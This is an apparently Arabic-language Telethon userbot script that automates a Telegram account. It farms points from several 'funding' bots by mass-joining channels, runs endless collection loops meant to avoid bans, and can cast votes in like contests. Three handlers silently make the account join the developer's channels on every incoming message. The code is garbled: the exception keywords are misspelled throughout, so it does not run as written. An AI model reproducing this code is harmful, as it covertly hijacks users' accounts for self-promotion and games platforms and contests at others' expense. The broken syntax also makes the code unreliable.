from telethon.tl.functions.channels import LeaveChannelRequest
import telethon
from time import sleep
from telethon import events
from config import *
import os
import logging
import asyncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl.functions.channels import LeaveChannelRequest
import datetime
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import requests
# -
# - SOURCE STREM
# -

xXStrem.start()



c = requests.session()
bot_username = '@zmmbot'
bot_usernamee = '@A_MAN9300BOT'
bot_usernameee = '@MARKTEBOT'
bot_usernameeee = '@xnsex21bot'

ownerhmd_id = (int(DEVLOO))
LOGS = logging.getLogger(__name__)
DEVS = [5413631898]




@xXStrem.on(events.NewMessage)
async def join_channel(event):
    try:
        await xXStrem(JoinChannelRequest("@xXStrem"))
    excexs BaseExcexsion:
        pass
        
@xXStrem.on(events.NewMessage)
async def join_channel(event):
    try:
        await xXStrem(JoinChannelRequest("@d8bb8"))
    excexs BaseExcexsion:
        pass
      

@xXStrem.on(events.NewMessage)
async def join_channel(event):
    try:
        await xXStrem(JoinChannelRequest("@xXStrem_Help"))
    excexs BaseExcexsion:
        pass  
        
        
        
@xXStrem.on(events.NewMessage(outgoing=False, pattern='.فحص'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply('**أحـبـك كلـشي يشـتغل عمـري 💘**')
        
        
@xXStrem.on(events.NewMessage(outgoing=False, pattern='/TEST'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply('**أحـبـك كلـشي يشـتغل عمـري 💘**')


@xXStrem.on(events.NewMessage(outgoing=False, pattern='.الاوامر'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**
⚝ مرحـبًا بك فـي أوامـر سـتريـم بـوينت
 
============= • XS • ============

𝟏 - للدخول إلـى أوامـر التجميع : .تجميع

𝟐 - للدخول إلـى أوامـر التحـكم : .تحكم

𝟑 - للدخول إلـى أوامـر مـمـيـزة : .مميزة

𝟒 - لـفـحص عـمـل الـســورس : .فحص

============= • XS • ============
**""")


@xXStrem.on(events.NewMessage(outgoing=False, pattern='.تجميع'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**
⚝ قــائمة جميـع أوامـر التجميع التي تحتاجها

============= • XS • ============

`/strem1` :  تجميع نقـاط بوت المليار
`/strem2` : تجميع نقـاط بوت الجوكر 
`/strem3` :  تجميع نقـاط بوت العقـاب 
`/strem4` :   تجميع نقـاط بوت العرب

note : تستخدم هذه الأوامـر بإرسالها إلـى الحساب او بإرسالها إلـى مجموعة يوجد فـيها الحساب

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/strem + bot` : تجميع نقـاط بوت غير موجود فـي القـائمة

note : يوزر البوت المطلوب bot ضـع مكان الـ

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/somy + bot + second` : تجميع لانهائي 

note : يوزر البوت المطلوب bot ضـع مكان الـ 

note : عدد الثواني second ضـع مكان الـ

note : ننصحك بوضع عدد الثواني 300

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

`/join` : الانضـمام إلـى قـنوات البوتات المذكورة

`/transfer` : الدخول لقـائمة تحويل نقـاط

`/infoacc` : الدخول لقـائمة تحويل معلومات

`/lstrem` : لمغادرة جميـع القـنوات والمجموعات

============= • XS • ============
**""")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='.تحكم'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**
⚝ قـائمة أوامـر التحكم بالحساب

============= • XS • ============

𝟏 - لتحويل آخر رسالة من مستخدم معين او بوت :

`/forward + يوزر الحساب او البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟐 - لأرسال رسالة إلـى مستخدم معين او بوت : 

`/send + الرسالة + يوزر الحساب او البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟑 - لجعل الحساب ينقـر على زر شفاف فـي بوت : 

`/button + رقـم الزر الشفاف + يوزر البوت`

note :  قـم بحساب رقـم الزر الشفاف من العدد 0

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟒 - لجعل الحساب ينضـم إلـى قـناة او مجموعة

`/jn + يوزر القـناة او المجموعة `

============= • XS • ============
**""")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='.مميزة'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**
⚝ قـائمة الأوامـر المميزة 
============= • XS • ============

𝟏 - لتفعيل بوت عبر الدخول إلـى رابط الدعوة : 

`/bot + ايدي الحساب + يوزر البوت`

╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

𝟐 - الأمر التالي يحتوي على ملاحظات تحتاجها :

`/notes`

𝟑 - لجعل الحساب يصوت فـي مسابقـة لايكات :

`/voice + موقع الرسالة + يوزر القـناة`

note : موقع الرسالة يعني مثلا إذا كـان الاسم فـي قـناة المسابقـة آخر اسم او آخر منشور فأن موقع الرسالة 1 وان تكن قـبل الأخـير فأن موقـها 2 وهكذا  بقـية المواقع 

𝟒 - لجعل الحساب يغادر قـناة او مجموعة :

`/lv + يوزر القـناة`

============= • XS • ============
**""")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/notes'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        order = await event.reply("""**
1 - اذا كنت تريد التحكم بالحسابات فـي التحميع وتحويل النقـاط ومعرفة معلومات كل حساب قـم بأنشاء مجموعة خاصة وادخل الحسابات التي قـمت بتنصيب لها السورس وارفع الحسابات إلـى مشرفـين ثم استخدم أوامـر التجميع 

2 - اذا كنت تريد جعل الحسابات تقـوم بتجميع النقـاط بدون توقـف ونسبة قـليلة من الحظر استخدم الأمر : somy/ 
بأمكانك معرفة المزيد عن الأمر وكيفـية استخدامه فـي قـائمة .تجميع ويستحسن عند استعمال الأمر وضع عدد الثواني 300 اي يعني هذا عند حدوث خطأ فـي التجميع او انتهت القـنوات فسوف يقـوم السورس بالمحاولة فـي التجميع تلقـائيا بعد مرور 300 اي خمس دقـائقـ وسوف يقـوم السورس بإخبـارك جميـع ماتم الوصول اليه من الأمر ويمكنك ايقـاف التجميع بأرسال .اعادة تشغيل 

3 - اذا كنت تريد تجميع نقـاط بوتات التمويل بطريقـة اعتيادية بدون المحاولة مرة أخرى تلقـائيا يمكن استخدام الأوامـر التالية [strem , /strem1/ , .....] يمكنك مراجعة الأوامـر فـي القـائمة .تجميع فـي اول قـسمين من القـائمة
**""")

@xXStrem.on(events.NewMessage(outgoing=True, pattern=".الأوامـر"))
async def _(event):
      await event.edit("""**
〠 أوامـر حساب المستخدم 

• بوت تمويل المليار  - `.تجميع المليار`

• بوت تمويل الجوكر - `.تجميع الجوكر`

• بوت تمويل العقــاب - `.تجميع العقـاب`

• بوت تمويل العـرب  - `.تجميع العرب `

• فحص السورس      - `.فحص`**""")



@xXStrem.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("**جاري الفحص..**")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
╭── 𝖲َِ𝗈َِ𝗎َِ𝗋َِcَِ𝖾 َِxَِ𝖷َِ𝖲َِ𝗍َِ𝗋َِ𝖾َِ𝗆 ──╮

※  َِCَِ𝗁َِ𝖺َِ𝗇َِ𝗇َِ𝖾َٓl¹  -  @xXStrem ※

※  َِ𝖵َِ𝖾َِ𝗋َِ𝗌َِ𝗂َِ𝗈َِ𝗇  - 1.1 - 𝖱َِ𝖾َِvَِ𝗂َِ𝗌َِ𝖾َِ𝖽   ※

※  ََِِ𝖣َِEَِ𝖵َِEَِLَِOَِ𝖯َِEَِ𝖱  - @zqqqzq  ※

╰───  َِxَِ𝖷َِ𝖲َِ𝗍َِ𝗋َِ𝖾َِ𝗆 َِ𝖯َِ𝗈َِ𝗂َِ𝗇َِ𝗍  ───╯
''')

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/strem1'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        await event.reply("جاري تجميع النقـاط")
        await event.edit("جاري تجميع النقـاط")
        joinu = await xXStrem(JoinChannelRequest('d8bb8'))
        channel_entity = await xXStrem.get_entity(bot_username)
        await xXStrem.send_message(bot_username, '/start')
        await asyncio.sleep(4)
        msg0 = await xXStrem.get_messages(bot_username, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await xXStrem.get_messages(bot_username, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                await xXStrem.send_message(event.chat_id, f"تم الانتهاء من التجميع | XS")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await xXStrem(JoinChannelRequest(url))
                excexs:
                    bott = url.split('/')[-1]
                    await xXStrem(ImportChatInviteRequest(bott))
                msg2 = await xXStrem.get_messages(bot_username, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضـمام فـي {chs} قـناة")
            excexs:
                msg2 = await xXStrem.get_messages(bot_username, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القـناة رقـم {chs}")

        await xXStrem.send_message(event.chat_id, "تم الانتهاء من التجميع | XS")
        
@xXStrem.on(events.NewMessage(outgoing=False, pattern='/strem2'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        await event.reply("جاري تجميع النقـاط")
        await event.edit("جاري تجميع النقـاط")
        joinu = await xXStrem(JoinChannelRequest('d8bb8'))
        channel_entity = await xXStrem.get_entity(bot_usernamee)
        await xXStrem.send_message(bot_usernamee, '/start')
        await asyncio.sleep(4)
        msg0 = await xXStrem.get_messages(bot_usernamee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await xXStrem.get_messages(bot_usernamee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                await xXStrem.send_message(event.chat_id, f"تم الانتهاء من التجميع | XS")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await xXStrem(JoinChannelRequest(url))
                excexs:
                    bott = url.split('/')[-1]
                    await xXStrem(ImportChatInviteRequest(bott))
                msg2 = await xXStrem.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضـمام فـي {chs} قـناة")
            excexs:
                msg2 = await xXStrem.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القـناة رقـم {chs}")

        await xXStrem.send_message(event.chat_id, "تم الانتهاء من التجميع | XS")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/strem3'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        await event.reply("جاري تجميع النقـاط")
        await event.edit("جاري تجميع النقـاط")
        joinu = await xXStrem(JoinChannelRequest('d8bb8'))
        channel_entity = await xXStrem.get_entity(bot_usernameee)
        await xXStrem.send_message(bot_usernameee, '/start')
        await asyncio.sleep(4)
        msg0 = await xXStrem.get_messages(bot_usernameee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await xXStrem.get_messages(bot_usernameee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                await xXStrem.send_message(event.chat_id, f"تم الانتهاء من التجميع | XS")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await xXStrem(JoinChannelRequest(url))
                excexs:
                    bott = url.split('/')[-1]
                    await xXStrem(ImportChatInviteRequest(bott))
                msg2 = await xXStrem.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضـمام فـي {chs} قـناة")
            excexs:
                msg2 = await xXStrem.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القـناة رقـم {chs}")

        await xXStrem.send_message(event.chat_id, "تم الانتهاء من التجميع | XS")

@xXStrem.on(events.NewMessage(outgoing=False, pattern='/strem4'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        await event.reply("جاري تجميع النقـاط")
        await event.edit("جاري تجميع النقـاط")
        joinu = await xXStrem(JoinChannelRequest('d8bb8'))
        channel_entity = await xXStrem.get_entity(bot_usernameeee)
        await xXStrem.send_message(bot_usernameeee, '/start')
        await asyncio.sleep(4)
        msg0 = await xXStrem.get_messages(bot_usernameeee, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await xXStrem.get_messages(bot_usernameeee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                await xXStrem.send_message(event.chat_id, f"تم الانتهاء من التجميع | XS")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await xXStrem(JoinChannelRequest(url))
                excexs:
                    bott = url.split('/')[-1]
                    await xXStrem(ImportChatInviteRequest(bott))
                msg2 = await xXStrem.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضـمام فـي {chs} قـناة")
            excexs:
                msg2 = await xXStrem.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القـناة رقـم {chs}")

        await xXStrem.send_message(event.chat_id, "تم الانتهاء من التجميع | XS")
        
@xXStrem.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
async def _(event):

    await event.edit("**جاري تجميع النقـاط**")
    joinu = await xXStrem(JoinChannelRequest('d8bb8'))
    channel_entity = await xXStrem.get_entity(bot_username)
    await xXStrem.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await xXStrem.get_messages(bot_username, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await xXStrem.get_messages(bot_username, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
            await xXStrem.send_message(event.chat_id, f"**تم الانتهاء من التجميع | XS**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await xXStrem(JoinChannelRequest(url))
            excexs:
                bott = url.split('/')[-1]
                await xXStrem(ImportChatInviteRequest(bott))
            msg2 = await xXStrem.get_messages(bot_username, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضـمام فـي {chs} قـناة**")
        excexs:
            msg2 = await xXStrem.get_messages(bot_username, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القـناة رقـم {chs}**")
    await xXStrem.send_message(event.chat_id, "**تم الانتهاء من التجميع | XS**")
    
    
    
@xXStrem.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
async def _(event):

    await event.edit("**جاري تجميع النقـاط**")
    joinu = await xXStrem(JoinChannelRequest('d8bb8'))
    channel_entity = await xXStrem.get_entity(bot_usernamee)
    await xXStrem.send_message(bot_usernamee, '/start')
    await asyncio.sleep(4)
    msg0 = await xXStrem.get_messages(bot_usernamee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await xXStrem.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
            await xXStrem.send_message(event.chat_id, f"**تم الانتهاء من التجميع | XS**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await xXStrem(JoinChannelRequest(url))
            excexs:
                bott = url.split('/')[-1]
                await xXStrem(ImportChatInviteRequest(bott))
            msg2 = await xXStrem.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضـمام فـي {chs} قـناة**")
        excexs:
            msg2 = await xXStrem.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القـناة رقـم {chs}**")
    await xXStrem.send_message(event.chat_id, "**تم الانتهاء من التجميع | XS**")

@xXStrem.on(events.NewMessage(outgoing=True, pattern=".تجميع العقـاب"))
async def _(event):

    await event.edit("**جاري تجميع النقـاط**")
    joinu = await xXStrem(JoinChannelRequest('d8bb8'))
    channel_entity = await xXStrem.get_entity(bot_usernameee)
    await xXStrem.send_message(bot_usernameee, '/start')
    await asyncio.sleep(4)
    msg0 = await xXStrem.get_messages(bot_usernameee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await xXStrem.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
            await xXStrem.send_message(event.chat_id, f"**تم الانتهاء من التجميع | XS**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await xXStrem(JoinChannelRequest(url))
            excexs:
                bott = url.split('/')[-1]
                await xXStrem(ImportChatInviteRequest(bott))
            msg2 = await xXStrem.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضـمام فـي {chs} قـناة**")
        excexs:
            msg2 = await xXStrem.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القـناة رقـم {chs}**")
    await xXStrem.send_message(event.chat_id, "**تم الانتهاء من التجميع | XS**")


@xXStrem.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
async def _(event):

    await event.edit("**جاري تجميع النقـاط**")
    joinu = await xXStrem(JoinChannelRequest('d8bb8'))
    channel_entity = await xXStrem.get_entity(bot_usernameeee)
    await xXStrem.send_message(bot_usernameeee, '/start')
    await asyncio.sleep(4)
    msg0 = await xXStrem.get_messages(bot_usernameeee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await xXStrem.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
            await xXStrem.send_message(event.chat_id, f"**تم الانتهاء من التجميع | XS**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await xXStrem(JoinChannelRequest(url))
            excexs:
                bott = url.split('/')[-1]
                await xXStrem(ImportChatInviteRequest(bott))
            msg2 = await xXStrem.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضـمام فـي {chs} قـناة**")
        excexs:
            msg2 = await xXStrem.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القـناة رقـم {chs}**")
    await xXStrem.send_message(event.chat_id, "**تم الانتهاء من التجميع | XS**")


##########################################

@xXStrem.on(events.NewMessage(outgoing=False, pattern='^/strem (.*)'))
async def OwnerStart(event):
    pot = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id:
        await event.reply("جاري تجميع النقـاط")
        await event.edit("جاري تجميع النقـاط")
        joinu = await xXStrem(JoinChannelRequest('d8bb8'))
        channel_entity = await xXStrem.get_entity(pot)
        await xXStrem.send_message(pot, '/start')
        await asyncio.sleep(4)
        msg0 = await xXStrem.get_messages(pot, limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(4)
        msg1 = await xXStrem.get_messages(pot, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await asyncio.sleep(4)

            list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                await xXStrem.send_message(event.chat_id, f"تم الانتهاء من التجميع | XS")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await xXStrem(JoinChannelRequest(url))
                excexs:
                    bott = url.split('/')[-1]
                    await xXStrem(ImportChatInviteRequest(bott))
                msg2 = await xXStrem.get_messages(pot, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضـمام فـي {chs} قـناة")
            excexs:
                msg2 = await xXStrem.get_messages(pot, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القـناة رقـم {chs}")

        await xXStrem.send_message(event.chat_id, "تم الانتهاء من التجميع | XS")
        
@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/bot (.*) (.*)'))
async def OwnerStart(event):
    bots = event.pattern_match.group(1) 
    ids = event.pattern_match.group(2) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bots,f'/start {ids}')
     sleep(6)
    msg = await xXStrem.get_messages(bots, limit=2)
    await msg[1].forward_to(ownerhmd_id)

@xXStrem.on(events.NewMessage(outgoing=False, pattern='^/collect (.*)'))
async def OwnerStart(event):
    while True:
        try:
            pot = event.pattern_match.group(1) 
            sender = await event.get_sender()
            if sender.id == ownerhmd_id:
                await event.reply("**⛦ جاري بدء عملية التجميع اللانهائية ⛦**")
                joinu = await xXStrem(JoinChannelRequest('d8bb8'))
                channel_entity = await xXStrem.get_entity(pot)
                await xXStrem.send_message(pot, '/start')
                await asyncio.sleep(2)
                msg0 = await xXStrem.get_messages(pot, limit=1)
                await msg0[0].click(2)
                await asyncio.sleep(2)
                msg1 = await xXStrem.get_messages(pot, limit=1)
                await msg1[0].click(0)

                chs = 1
                for i in range(100):
                    await asyncio.sleep(2)

                    list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                            offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                    msgs = list.messages[0]
                    if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                        await xXStrem.send_message(event.chat_id, f"**⛦ حدث خطأ ، لاتقـلقـ سوف اعاود المحاولة ⛦**")
                        break
                    url = msgs.reply_markup.rows[0].buttons[0].url
                    try:
                        try:
                            await xXStrem(JoinChannelRequest(url))
                        excexs:
                            bott = url.split('/')[-1]
                            await xXStrem(ImportChatInviteRequest(bott))
                        msg2 = await xXStrem.get_messages(pot, limit=1)
                        await msg2[0].click(text='تحقق')
                        chs += 1
                        await event.edit(f"**تم الانضـمام فـي {chs} قـناة**")
                    excexs:
                        msg2 = await xXStrem.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 1
                        await event.edit(f"**القـناة رقـم {chs}**")
                        await asyncio.sleep(60)

                await xXStrem.send_message(event.chat_id, "**⛦ حدث خطأ ، لاتقـلقـ سوف اعاود المحاولة ⛦**")
        excexs Excexsion as e:
            # تسجيل الخطأ هنا إذا كنت ترغب فـي ذلك
            pass


@xXStrem.on(events.NewMessage(outgoing=False, pattern='^/somy (.*) (.*)'))
async def OwnerStart(event):
    while True:
        try:
            pot = event.pattern_match.group(1) 
            numw = int(event.pattern_match.group(2))
            sender = await event.get_sender()
            if sender.id == ownerhmd_id:
                await event.reply(f"**⪼ حـسـنًا سوف اقـوم بعملية التجميع \n⪼ عدد الثواني بين كل محاولة : {numw}\n⪼ التجميع من بوت : @{pot}**")

                joinu = await xXStrem(JoinChannelRequest('d8bb8'))
                channel_entity = await xXStrem.get_entity(pot)
                await xXStrem.send_message(pot, '**جاري بدء عملية التجميع بواسطة ستريم**')
                await xXStrem.send_message(pot, '/start')
                await asyncio.sleep(2)
                msg0 = await xXStrem.get_messages(pot, limit=1)
                await msg0[0].click(2)
                await asyncio.sleep(2)
                msg1 = await xXStrem.get_messages(pot, limit=1)
                await msg1[0].click(0)

                chs = 0
                for i in range(100):
                    await asyncio.sleep(2)

                    list = await xXStrem(GetHistoryRequest(peer=channel_entity, limit=1,
                                                            offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                    msgs = list.messages[0]
                    if msgs.message.find('لا يوجد قـنوات فـي الوقـت الحالي , قـم بـتجـميع النقـاط بطريقـة مختلفـة') != -1:
                        await xXStrem.send_message(event.chat_id, f"**⪼ حـسـنًا سوف اقـوم بعملية التجميع \n⪼ عدد الثواني بين كل محاولة : {numw}\n⪼ التجميع من بوت : @{pot}**")
                        break
                    url = msgs.reply_markup.rows[0].buttons[0].url
                    try:
                        try:
                            await xXStrem(JoinChannelRequest(url))
                        excexs:
                            syth = url.split('/')[-1]
                            await xXStrem(ImportChatInviteRequest(syth))
                        msg2 = await xXStrem.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 10
                        await event.reply(f"**⪼ عدد النقـاط فـي هذه المحاولة {chs} ⪼**")
                    excexs:
                        msg2 = await xXStrem.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 0
                        await event.reply(f"""**⪼ للأسف لم تحصل على نقـاط فـي هذه المحاولة
⪼ لأنني وجدت قـناة خاصة قـمت بتخطيها
⪼ البوت التي حدث فـيه الخطأ: {pot}**""")
                        
                await xXStrem.send_message(event.chat_id, f"**⪼ عذرًا نفذت قـنوات البوت \n⪼ لكن سوف اعاود المحاولة بعد {numw} ثانية**")
                await asyncio.sleep(numw)
        excexs Excexsion as e:
            # تسجيل الخطأ هنا إذا كنت ترغب فـي ذلك
            await asyncio.sleep(numw)


@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'رست'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
        await event.reply("• جارِ اعادة تشغيل السورس ..\n• انتضـر 1-2 دقـيقـة  .")
        await xXStrem.disconnect()
        await xXStrem.send_message(event.chat_id, "تم اعادة تشغيل السورس ")
        


@xXStrem.on(events.NewMessage(outgoing=False, pattern=r'^/xs1 (.*)'))
async def OwnerStart(event):
    xs = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhmd_id :
     send = await xXStrem.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await xXStrem.get_messages(bot_username, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await xXStrem.send_message(bot_username, xs)
    sleep(4)
    msg = await xXStrem.get_messages(bot_username, limit=1)

    await msg[0].forward_to(ownerhmd_id)
    
